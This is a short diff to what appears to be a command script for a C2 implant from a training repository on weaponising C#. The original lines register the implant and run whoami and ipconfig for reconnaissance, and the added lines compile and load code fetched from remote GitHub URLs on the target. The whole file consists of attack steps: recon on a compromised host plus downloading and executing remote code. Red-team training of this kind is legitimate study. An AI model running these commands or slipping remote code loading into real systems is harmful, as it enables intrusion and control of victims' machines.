@@ -1,3 +1,5 @@
 register
 run whoami
 run ipconfig
+compile https://raw.githubusercontent.com/fozavci/WeaponisingCSharp-Fundamentals/main/c2/hello.cs
+load https://raw.githubusercontent.com/fozavci/WeaponisingCSharp-Fundamentals/main/c2/hello.exe
